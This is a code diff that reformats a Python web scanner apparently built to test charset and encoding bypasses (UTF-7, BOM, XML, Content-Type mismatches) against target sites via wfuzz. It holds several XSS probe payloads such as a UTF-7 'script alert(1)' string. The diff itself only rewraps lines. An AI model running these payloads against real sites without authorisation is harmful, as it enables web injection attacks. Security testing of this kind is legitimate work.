@@ -152,12 +152,42 @@ _CATEGORY_MAP, _CHARSETS, _XSS_PAYLOADS, _SQLI_PAYLOADS = _load_charsetbypass_da
 
 
 _MISMATCH_PAYLOADS: list[tuple[str, str, bytes, str]] = [
-    ("ct_utf8_as_latin1", "text/html; charset=iso-8859-1", "\u00e9\u00e8\u00ea".encode("utf-8"), "UTF-8 body with latin-1 Content-Type"),
-    ("ct_latin1_as_utf8", "text/html; charset=utf-8", b"\xe9\xe8\xea", "Latin-1 body with UTF-8 Content-Type"),
-    ("ct_utf7_xss", "text/html; charset=utf-7", "<script>alert(1)</script>".encode("ascii"), "ASCII XSS with UTF-7 Content-Type"),
-    ("ct_win1252_as_utf8", "text/html; charset=utf-8", b"\x93\x94\x91\x92", "Windows-1252 quotes as UTF-8"),
-    ("ct_utf16_as_iso", "text/html; charset=iso-8859-1", "\u00e9\u00e8".encode("utf-16-le"), "UTF-16LE body with ISO-8859-1 Content-Type"),
-    ("ct_multipart_mismatch", "text/html; charset=iso-8859-1", b'<meta charset="utf-8">\xe9', "Mixed meta charset with latin-1 byte"),
+    (
+        "ct_utf8_as_latin1",
+        "text/html; charset=iso-8859-1",
+        "\u00e9\u00e8\u00ea".encode("utf-8"),
+        "UTF-8 body with latin-1 Content-Type",
+    ),
+    (
+        "ct_latin1_as_utf8",
+        "text/html; charset=utf-8",
+        b"\xe9\xe8\xea",
+        "Latin-1 body with UTF-8 Content-Type",
+    ),
+    (
+        "ct_utf7_xss",
+        "text/html; charset=utf-7",
+        "<script>alert(1)</script>".encode("ascii"),
+        "ASCII XSS with UTF-7 Content-Type",
+    ),
+    (
+        "ct_win1252_as_utf8",
+        "text/html; charset=utf-8",
+        b"\x93\x94\x91\x92",
+        "Windows-1252 quotes as UTF-8",
+    ),
+    (
+        "ct_utf16_as_iso",
+        "text/html; charset=iso-8859-1",
+        "\u00e9\u00e8".encode("utf-16-le"),
+        "UTF-16LE body with ISO-8859-1 Content-Type",
+    ),
+    (
+        "ct_multipart_mismatch",
+        "text/html; charset=iso-8859-1",
+        b'<meta charset="utf-8">\xe9',
+        "Mixed meta charset with latin-1 byte",
+    ),
 ]
 
 
@@ -307,7 +337,9 @@ async def _test_meta_charset(
                         status_changed=status_changed,
                         size_changed=size_changed,
                         vulnerable=vulnerable,
-                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                        details=f"Status {b_status}->{t_status}"
+                        if status_changed
+                        else "Sem mudanca",
                         error="",
                         exploit="encoding_bypass_payload" if vulnerable else "",
                         tool="wfuzz",
@@ -388,7 +420,9 @@ async def _test_content_type_charset(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="encoding_bypass_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -444,7 +478,9 @@ async def _test_content_type_charset(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="encoding_bypass_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -528,7 +564,9 @@ async def _test_bom_charset(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="encoding_bypass_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -610,7 +648,9 @@ async def _test_xml_charset(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="encoding_bypass_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -657,7 +697,12 @@ async def _test_mixed_charset(
     mixed_payloads = [
         ("meta_bom", "utf-7", b"+/v8", "<script>alert(1)</script>"),
         ("ct_meta", "utf-7", None, "<script>alert(1)</script>"),
-        ("ct_xml", "utf-16le", None, '<?xml version="1.0" encoding="utf-16le"?><root>alert(1)</root>'),
+        (
+            "ct_xml",
+            "utf-16le",
+            None,
+            '<?xml version="1.0" encoding="utf-16le"?><root>alert(1)</root>',
+        ),
     ]
 
     for technique, charset, bom_bytes, payload in mixed_payloads:
@@ -694,7 +739,9 @@ async def _test_mixed_charset(
                     status_changed=status_changed,
                     size_changed=abs(t_size - b_size) > 50,
                     vulnerable=vulnerable,
-                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
+                    details=f"Status {b_status}->{t_status}"
+                    if status_changed
+                    else "Sem mudanca",
                     error="",
                     exploit="encoding_bypass_payload" if vulnerable else "",
                     tool="wfuzz",
@@ -852,7 +899,12 @@ def print_results_fn(result: CharsetBypassResult) -> None:
 
     print(color(f"  Target: {result.target}", Cyber.WHITE))
 
-    print(color(f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
+    print(
+        color(
+            f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.GRAY,
+        )
+    )
 
     print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))
 
